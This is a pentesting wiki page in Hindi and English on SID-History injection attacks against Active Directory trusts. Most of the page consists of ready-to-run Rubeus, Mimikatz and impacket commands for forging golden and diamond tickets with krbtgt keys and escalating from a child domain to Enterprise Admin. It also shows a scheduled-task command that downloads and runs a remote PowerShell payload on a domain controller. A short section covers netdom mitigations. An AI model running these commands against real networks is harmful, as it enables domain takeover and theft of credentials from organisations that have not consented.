# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

**SID History Injection Attack** का मुख्य उद्देश्य **domains के बीच user migration** में सहायता करना है, ताकि पुराने domain के resources तक निरंतर access बना रहे। यह user के पिछले Security Identifier (SID) को उसके नए account की **SID History** में शामिल करके किया जाता है। विशेष रूप से, इस प्रक्रिया में parent domain के किसी उच्च-privilege group (जैसे Enterprise Admins या Domain Admins) का SID SID History में जोड़कर unauthorized access दिया जा सकता है। इस exploitation से parent domain के सभी resources तक access मिल जाता है।<sup>[[1]](#references)[[2]](#references)</sup>

इस attack को execute करने के लिए दो methods मौजूद हैं: **Golden Ticket** या **Diamond Ticket** बनाकर।

**"Enterprise Admins"** group का SID पता करने के लिए पहले root domain का SID ढूंढना आवश्यक है। इसकी पहचान के बाद, root domain के SID के अंत में `-519` जोड़कर Enterprise Admins group का SID बनाया जा सकता है। उदाहरण के लिए, यदि root domain SID `S-1-5-21-280534878-1496970234-700767426` है, तो "Enterprise Admins" group का SID `S-1-5-21-280534878-1496970234-700767426-519` होगा।<sup>[[1]](#references)</sup>

आप **Domain Admins** groups का भी उपयोग कर सकते हैं, जिनका अंत **512** से होता है।

किसी अन्य domain के group (उदाहरण के लिए "Domain Admins") का SID ढूंढने का एक और तरीका है:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> ध्यान दें कि trust relationship में SID history को disable करना संभव है, जिससे यह attack fail हो जाएगा।

[**docs**](https://technet.microsoft.com/library/cc835085.aspx) के अनुसार:<sup>[[3]](#references)</sup>
- netdom tool का उपयोग करके **forest trusts पर SIDHistory को disable करना** (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- netdom tool का उपयोग करके **external trusts पर SID Filter Quarantining लागू करना** (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **एक ही forest के भीतर domain trusts पर SID Filtering लागू करना** recommended नहीं है, क्योंकि यह एक unsupported configuration है और breaking changes का कारण बन सकती है। यदि forest के भीतर कोई domain untrustworthy है, तो उसे forest का member नहीं होना चाहिए। इस स्थिति में पहले trusted और untrusted domains को अलग-अलग forests में split करना आवश्यक है, ताकि interforest trust पर SID Filtering लागू की जा सके।

इसे bypass करने के बारे में अधिक जानकारी के लिए यह post देखें: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>

### Diamond Ticket (Rubeus + KRBTGT-AES256)

पिछली बार जब मैंने इसे try किया था, तो मुझे **`/ldap`** arg जोड़ना पड़ा था।
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) with KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
अधिक जानकारी के लिए golden tickets देखें:


{{#ref}}
golden-ticket.md
{{#endref}}


अधिक जानकारी के लिए diamond tickets देखें:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
compromised domain के KRBTGT hash का उपयोग करके root या Enterprise admin के DA तक privilege escalate करें:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
हमले से प्राप्त permissions के साथ आप नए domain में उदाहरण के लिए DCSync attack execute कर सकते हैं:


{{#ref}}
dcsync.md
{{#endref}}

### Linux से

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) के साथ Manual तरीके से
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) का उपयोग करके Automatic

यह एक Impacket script है जो **child domain से parent domain तक escalating को automate करेगी**। Script को इनकी आवश्यकता होती है:

- Target domain controller
- child domain के किसी admin user के Creds

Flow इस प्रकार है:

- parent domain के Enterprise Admins group के लिए SID प्राप्त करता है
- child domain में KRBTGT account का hash प्राप्त करता है
- एक Golden Ticket बनाता है
- parent domain में Login करता है
- parent domain में Administrator account के credentials प्राप्त करता है
- यदि `target-exec` switch निर्दिष्ट किया गया है, तो यह Psexec के माध्यम से parent domain के Domain Controller के विरुद्ध authenticate करता है।
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## संदर्भ

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Security Identifier (SID) क्या है? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Trusts के लिए Security Considerations - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
- [4] [itm8.com - Domains के बीच Security Boundary के रूप में SID Filter, भाग 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

{{#include ../../banners/hacktricks-training.md}}
